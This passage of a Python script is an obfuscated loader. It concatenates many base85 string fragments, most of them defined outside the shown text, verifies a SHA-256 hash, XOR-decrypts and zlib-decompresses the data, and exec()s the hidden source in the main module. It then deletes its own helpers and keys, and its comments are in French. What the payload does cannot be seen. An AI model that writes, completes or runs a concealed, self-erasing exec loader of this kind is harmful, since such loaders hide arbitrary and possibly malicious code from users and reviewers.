_csLyE6WtAS97Sb = '^r?Y9hzqQ+>#lX5VJoFH^{v4Khgh*QJ_5*H652TD6Y-8D=(TZK-!c!st6xl!1duWyEnPfFT'
_ctnGT0j4MXxcSv = '(XAWJ-*j7t7s+V{xDP6{<mLNur~zKZMY$=;M1W&`4N1>?cX#_(EUT}RuCPNr;bMUY^Wq)AH'
_cidMLEuYljcaKn = 'Ys;BX_~GB8l_}Xf*|mOYIMy&BzuedtOpEj)&$>@q5}{FDn<M6YcY$yH}Yp4s1ZX0&&Sc1lO'
_cpXIBishXiz95r = 'PR;GNJluHp)QXuX#piud?7F+RR7(8G$>vu$3%72$h?11A@R5I!gJWvuJB6lY!Hr%vtf)#$D'
_cfauTt3eEbsKv9 = '!&OfK&;(ZQ<=R08}VH1oB$91Og0(pIPL6Okn(!nwp@7?pYq8`;Up_O~<N(Cl(k|j{K$hcno'
_cu0Bsg3NnGSQyo = '6k_(G#j6*w*1}muuKMUaVofEKiqRjEZgaWL)R#hC{1o(6-SUOW2G5=CChflc3J{whD&US&x'
_cwXQ4lp9s7YldX = '&y?ZltEtIUG6YZR4ZWLuV=qfm57q`R11CtJ+9DsB>1*+8g*Xw;BGtUX#jGP=`z8Mx8t}Ll>'
_c_rKY_krn9aQDu = 'IZeYXFQ1DD=RGDth@l!7Z-iC@bH+-cb&CTk7=oXd9z6&m>E1`klmA+<S*DzY7IJ<LlaTH9o'
_cqxlMFnO6Qu7PN = '-&sJfVm;5Shl&b&l?PW74-;08@?u-;ZQM0f'

_pxWw5wo05f3dFK = __import__('base64').b85decode(_cw9XnNROr4qZda + _cjEWP9cQCTUexr + _cw5eedBNJj69ut + _cuqrqDJat53sBD + _czNuCQdKi_CbCj + _ckaf2PkN1NmfSI + _cswuV9uoU_IX8n + _cmgVg4nWwfoZHH + _cbRghhHRBs3w4Z + _c_KVecgBFhyznN + _cpwbt3iHNtqfqA + _c_TOoKhEmwxNKT + _cpOivZbHvoujEO + _cgLcMXUprL3pe3 + _cdWLcoiDZqPrtX + _ccueqevgShz1Tt + _cyTEW_OSaDW4cf + _cdwDu7cNExJeQ3 + _c_W9zerkEC04p2 + _clgtsyDkIfUJDf + _cfcZ7be9O0hxvF + _cex1drTFssJzu_ + _cfHqw5R13bpjBw + _cqZjzRpns5Q1l2 + _ck4zrg43yN7wO8 + _ccQwq6f1tMk7W5 + _crVz1CZddqKWGx + _cto6pbFu_iVPf3 + _cgIQFWFBPYU7XA + _cu3KMDMijaTHrQ + _cylimmpH8j2kVq + _ccThAM26nOrVkO + _cjMZnNXXZjhQKP + _cxldFqprF0Mt5D + _crnFzjVjO1FFyp + _cjHCqZpDXcOebS + _cx3qYkz_PdTADy + _ccz9pXN5Fv8nsU + _czWoTsqiH4q4If + _cukq0qS0G1Qg1U + _czRc9suD4AUrAf + _cu4ysVLoUFGX4w + _cr7gV8KZJ6H4la + _cpUq6zwokqP5Gx + _cwqrYi5SHDDlmc + _cxEoDun9D39l2o + _c_WhcocOmODjjM + _csrK3f6nb4TJei + _ce59ai6jwL6kBD + _cutTRAcp57Iz8l + _crcv1f7IPSLKCT + _ca2OpasC92BRT0 + _csPL4ajqceAY2B + _cwfHma1vkgVsQP + _csCZcl_PPNi6Sg + _chpijOXuQGh1SJ + _cgAJZaR0XumGDU + _chdvQ19qW9cyJP + _cb20wjFXByQqeP + _chv4FNGOAUliWQ + _caTYawfyGXnKBH + _cxpHCm3l0rr6Js + _cbJ0ibWCfYImVn + _crI4KzcKmAxaJG + _cnFmxlwmHt0p7U + _cmVHH_wuTyW0XP + _cqTZSvAzNfRJIA + _clW1UZ3rPRE7wG + _crDxX1ENR4Ww0R + _cjRoXG2zNfPw11 + _cnQ4CwzKKJhDYp + _chk6onV9kgvw0K + _cyewLeKtI02_dC + _cyeJCEV1_dbVPP + _cb4npJMcCP8TaL + _csMcytJTvw_dWv + _cp7AKlBjJ4fZuG + _cdyuilIs17y3k3 + _cwkueXP0LONIpM + _crson8jN6yPsd3 + _chYEWxYboUg6TT + _cbquqzHrt00bSl + _crhKiv0d22VMQ_ + _crZnfLLXc0FWhe + _cfFVXD8nPsfj4z + _cr00TRG_odSXWA + _c_tAcuJ2emtEqB + _c_lzi4S27Go2Em + _cnwJ83HuHt685I + _cmSPBPqGwNVReV + _cmcwNUtV5_dvgU + _cngJOp_QK7ualk + _ck2wy_RCqtHjK6 + _cixVz0a44F4mFr + _caNzOiW75o5rmb + _cdcBntU55cRivZ + _csYsjGlWMOnKSe + _ceUrfgfieDKWpR + _clMS6rCO3IE92P + _cpVJeIN4wJalc7 + _cknQlSnoTZmP08 + _cuPI65WWYeuAXs + _cyQYd6xKIumjVk + _clwFrgTTT21v7h + _cbrhnIuv7Ricav + _ctc0ihNT9Cl8T4 + _cpH3RZf7R0D2Wt + _csoFU4CXEjyZVH + _ck4cp3uDjpNPNf + _czL8zo0INNBBxE + _cxZH22Tzsom0xG + _cuLNhpL7TGMGU8 + _cjkM6tJ5zHygUv + _cqoiBX2vJlZQYC + _cjf2FmrSWtLMB4 + _cwt_0DBhzjPlCA + _clZ8EcQs3u78FO + _cjTgCK2ZnO4dSM + _czgC9ZxtTRNSsL + _cquHSWEw5yinXw + _cyc2D9cZW5HjqG + _ciasnDYsOAy8eD + _clYZ4wdSdhydTF + _cwLqwNhazwCMBK + _cx3OV7Wt0ufI0W + _cmGBXwe6hL7red + _cwdQjEoYmHOb2y + _cuQFmEokVPaqbn + _ciCbYhMqGLq5CL + _cy0n5JwYepD4zX + _cgorW33bgKYauG + _cr5krX2Zy3diyi + _cnW42FkZaGOWCf + _cksLZYs3GIRfvV + _camFlF4ZLsSmhZ + _ciULtrYQc1pLnQ + _cs03WOK_KKOVUs + _c_vcGKjmXA7SQA + _cc6IEWvQ6b3DuH + _ckJL27mryJ8W9f + _czY7Oq_aTaDVBE + _clS2f6pWcbwBJ3 + _cjRbCVzie1A7oc + _caY0nWC_wMLBC2 + _clrjlpe4C6huWJ + _cisd9y1IWs305R + _cmb5kQo7Z2g59V + _chhCPXhcuhQ6Ej + _c_Abc_xLfOwM1i + _cfaFUSNwFMl5SA + _cekQEMAbxW18bS + _cxTPS5Soi_TQ7e + _cfKkUhNrkooqul + _ch3ZjpVkVmPGKN + _ccLGd1I9_DGLW7 + _cvPoQakzBWRpvr + _cngEPu8wZsqg9E + _cqHKmNA9GXLNeI + _cbgYGH9d9XFmI2 + _cl0g2hYv6ZlU3_ + _csLyE6WtAS97Sb + _ctnGT0j4MXxcSv + _cidMLEuYljcaKn + _cpXIBishXiz95r + _cfauTt3eEbsKv9 + _cu0Bsg3NnGSQyo + _cwXQ4lp9s7YldX + _c_rKY_krn9aQDu + _cqxlMFnO6Qu7PN)
if __import__('hashlib').sha256(_pxWw5wo05f3dFK).hexdigest() != '90f3417a61c3afe73feb5362680ff10643bb9204ca1a4b43d4d2908ac766a14c':
    __import__('sys').exit(1)
_xlLqNCMM2pkiaV = bytes([41, 22, 1, 45, 33, 207, 118, 178, 68, 21, 103, 9, 31, 184, 220, 11, 143, 95, 210, 133, 149, 226, 25, 76, 3, 133, 186, 2, 79, 193, 233, 12])
_fkwGm4UDwlMfAN5 = bytes([138, 209, 254, 232, 168, 4, 25, 150, 151, 14, 194, 13, 142, 53, 25, 192, 253, 53, 6, 197, 96, 172, 230, 77, 108, 57, 162, 150, 223, 164, 254, 36])

def _fxtdouDQ_3Eir0H(_bj15ZN88jm8mxu, _kx3yIDYTZotTA6):
    return bytes(_bj15ZN88jm8mxu[_ixPBbj6E2Tqr94] ^ _kx3yIDYTZotTA6[_ixPBbj6E2Tqr94 % len(_kx3yIDYTZotTA6)] for _ixPBbj6E2Tqr94 in range(len(_bj15ZN88jm8mxu)))

def _fdmxMxx71YI4Uih(_tbrsib9amha0RN):
    import zlib
    return zlib.decompress(_tbrsib9amha0RN) # Un seul niveau de zlib ici pour simplifier

def _feuz9VEwcYJBz3I():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xyWmmwpYTPVzR2 = _fxtdouDQ_3Eir0H(_pxWw5wo05f3dFK, _xlLqNCMM2pkiaV)
    # 2. Décompression Zlib
    _dr19T3m4F3gSrd = _fdmxMxx71YI4Uih(_xyWmmwpYTPVzR2)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dr19T3m4F3gSrd.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nxiAT0WS02tZf3 = _main.__dict__
    _nxiAT0WS02tZf3.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nxiAT0WS02tZf3)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feuz9VEwcYJBz3I()
try:
    del _fxtdouDQ_3Eir0H, _fdmxMxx71YI4Uih, _feuz9VEwcYJBz3I
    del _pxWw5wo05f3dFK, _xlLqNCMM2pkiaV, _fkwGm4UDwlMfAN5
except:
    pass
